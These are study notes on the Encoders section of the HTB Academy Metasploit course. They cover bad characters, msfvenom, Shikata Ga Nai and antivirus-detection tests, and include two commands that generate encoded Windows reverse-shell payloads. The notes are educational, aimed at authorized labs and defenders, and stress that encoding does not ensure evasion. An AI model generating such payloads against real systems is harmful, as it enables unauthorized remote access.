# HTB Academy: Using the Metasploit Framework

> Engagement-ready study notes for authorized HTB labs and assessments.

## Module information
- **Section:** 7 / 15 — Encoders
- **Progress at capture:** 40%
- **Focus:** Payload compatibility, bad characters, encoder selection, Shikata Ga Nai, and the limits of encoding for antivirus evasion.

---

## 7. Encoders

### Learning objectives
- Understand why Metasploit encoders exist.
- Recognize architecture and platform compatibility requirements.
- Understand bad characters and why payloads may need to avoid them.
- Distinguish the historical `msfpayload` / `msfencode` workflow from modern `msfvenom`.
- Inspect compatible encoders in `msfconsole`.
- Explain why encoding does not guarantee antivirus evasion.

### What is an encoder?

A Metasploit encoder transforms a payload representation. Historically, encoders have helped payloads fit architecture or delivery constraints, avoid specified bytes, and change the byte representation.

Architectures named in the lesson:

| Architecture | Meaning |
|---|---|
| `x86` | 32-bit Intel/AMD |
| `x64` | 64-bit Intel/AMD |
| `sparc` | SPARC |
| `ppc` | PowerPC |
| `mips` | MIPS |

**Important:** Encoding is not compilation for another platform, a change in payload capability, or a guarantee of stealth. The payload, target architecture, exploit, and execution environment must still be compatible.

### Bad characters

A bad character is a byte that cannot safely appear in a payload for a particular delivery path. For example, a null byte (`\x00`) may terminate a string in some vulnerable programs or input-handling routines.

Bad-character lists are context-specific. A byte unsafe for one exploit path may be valid in another. Determine constraints from the target and exploit behavior instead of assuming a universal list.

Metasploit's `-b` option supplies bytes to avoid during generation/encoding.

### Historical workflow: msfpayload and msfencode

The course describes the older, pre-2015 workflow:
- `msfpayload` generated the payload.
- `msfencode` encoded its output, for example to avoid a null byte and emit a chosen format.
- A pipe (`|`) passed the first command's output to the second.

Historical example from the lesson:

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

This is legacy syntax illustrating the framework's evolution. Modern installations generally use `msfvenom`; do not assume these older utilities are installed or supported.

### Modern workflow: msfvenom

`msfvenom` combines payload generation and encoding. The lesson's x86 Windows example, with a null byte excluded and Perl output selected:

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

| Option | Purpose |
|---|---|
| `-a x86` | Specify target architecture |
| `--platform windows` | Specify target platform |
| `-p` | Select a payload |
| `LHOST` / `LPORT` | Configure callback address and port for a reverse payload |
| `-b "\x00"` | Identify a byte to avoid |
| `-f perl` | Select output format |

The lesson output reports compatible encoders and shows `x86/shikata_ga_nai` being selected automatically in its example. Availability and selection vary with Metasploit version, payload, architecture, and platform.

**Lab safety:** Generate and execute payloads only in an isolated HTB lab or another explicitly authorized environment. Use lab-assigned callback values rather than copying example addresses into a real network.

### Shikata Ga Nai (SGN)

`x86/shikata_ga_nai` is a polymorphic XOR additive-feedback encoder. The Japanese phrase **仕方がない** is commonly translated as “it cannot be helped” or “nothing can be done.”

The module explains that SGN was historically popular because its output was difficult for older signature-based detection to recognize. Modern antivirus and endpoint detection have improved; an SGN-encoded payload should not be considered undetectable.

The lesson compares the beginning of the generated Perl buffer before and after encoding. The key concept is that encoding changes the byte representation; the underlying payload behavior remains.

### Encoder iterations

The `-i` option controls the number of encoding iterations in the lesson's examples.

- Each successful iteration transforms the representation again.
- Repeated encoding can increase encoded payload size.
- More iterations do not establish that a result is safe or undetectable.
- Compatibility and size constraints still apply.

The module's example reports that ten SGN iterations still resulted in substantial antivirus detection. **Iteration count is not an antivirus-evasion guarantee.**

### Selecting compatible encoders in msfconsole

Within an exploit context, use:

```text
show encoders
```

Metasploit filters the list according to the selected exploit and payload. The output is not necessarily every encoder installed in the framework.

The lesson shows:
- An x64 context may list `x64/xor`, `x64/xor_dynamic`, and `x64/zutto_dekiru`.
- An x86 context may list alpha encoders, `x86/shikata_ga_nai`, and other transformations.
- `generic/none` is also shown as an option in an example.

The exact list depends on framework version and current context. If an encoder is absent, it may simply be incompatible with the selected exploit/payload.

### Antivirus testing: lesson findings

The module submits a generated executable to VirusTotal and shows many antivirus engines identifying it as malicious. It then repeats the experiment with multiple encoding iterations and still observes a high detection count.

The durable conclusions are:
- Encoding changes representation, not the fundamental behavior of a payload.
- Detection may use static signatures, heuristics, machine learning, and runtime behavior.
- Multiple iterations do not guarantee evasion.
- A clean scan result would not prove a file is benign.

The detection percentages in the lesson are historical examples, not current measurements. Vendor engines, signatures, and sample reputation change over time.

**Third-party data caution:** Uploading a sample to VirusTotal can disclose it to the service and its security partners. Never upload client-confidential binaries, proprietary files, credentials, or sensitive artifacts without explicit authorization and an appropriate data-handling decision.

### msf-virustotal

The lesson introduces `msf-virustotal`, which can submit a file for analysis using a VirusTotal API key:

```bash
msf-virustotal -k <API_KEY> -f <FILE>
```

- `-k` supplies the API key.
- `-f` identifies the file.
- Output may include hashes, a report URL, queued-analysis messages, and detections.

Treat API keys as secrets. Do not put a real key in notes, shell transcripts, screenshots, Git commits, or shared reports. Analysis may take time to complete.

### Troubleshooting and interpretation

| Symptom | Possible explanation | What to verify |
|---|---|---|
| No compatible encoders | Selected payload/exploit has no matching encoder | Confirm architecture, platform, payload, exploit |
| Encoder not listed | Incompatible with current selection | Inspect selected payload; rerun `show encoders` |
| Output larger than expected | Encoding and executable format add overhead | Compare reported payload and final file sizes |
| Payload fails to execute | Architecture, platform, transport, or payload mismatch | Validate lab target and compatibility |
| Bad character remains / payload breaks | Constraint incomplete or input path misunderstood | Reassess actual input path and byte constraints |
| Antivirus detects file | Encoding is not reliable evasion | Do not infer safety from iteration count |
| VirusTotal analysis pending | Remote analysis incomplete | Check later; avoid unnecessary resubmission |
| Permission denied writing output | Current user cannot write to selected directory | Use an authorized working directory |

### Defensive perspective

For defenders and detection engineers, consider:
- Unexpected executable creation by penetration-testing tools.
- Suspicious process execution and reverse-connection behavior.
- Different byte representations with similar runtime behavior.
- Endpoint telemetry, network egress, and command-line auditing.
- Hash and reputation checks as only one detection layer.

Encoding is not a substitute for execution controls, behavioral monitoring, least privilege, application control, and network segmentation.

### Engagement workflow checklist

- [ ] Confirm authorization and target scope.
- [ ] Identify target platform and architecture.
- [ ] Understand exploit input and bad-character constraints.
- [ ] Select a compatible payload and output format.
- [ ] Inspect encoders in the current Metasploit context.
- [ ] Treat encoding as a compatibility transformation, not a stealth guarantee.
- [ ] Test only in the approved lab or assessment environment.
- [ ] Protect API keys and generated artifacts.
- [ ] Record tool version, options, output hash, test result, and cleanup.
- [ ] Remove temporary payloads and listeners when the exercise is complete.

### Key takeaways

1. Encoders transform payload representation and can help meet architecture or bad-character constraints.
2. The legacy `msfpayload` and `msfencode` tools were consolidated into `msfvenom`.
3. `show encoders` lists encoders compatible with the current exploit/payload context.
4. Shikata Ga Nai was historically popular, but modern detection can identify encoded payloads.
5. More iterations do not guarantee antivirus evasion.
6. VirusTotal results are time-sensitive, and uploading samples can disclose them to a third party.
7. Compatibility, authorization, evidence handling, and cleanup matter more than assuming an encoded payload is invisible.

---

## Source scope

Based on the supplied HTB Academy **Using the Metasploit Framework — Section 7: Encoders** material. Explanatory notes and operational cautions are added for clarity; historical command examples and detection figures are retained as lesson examples, not claims about current tool or antivirus behavior.
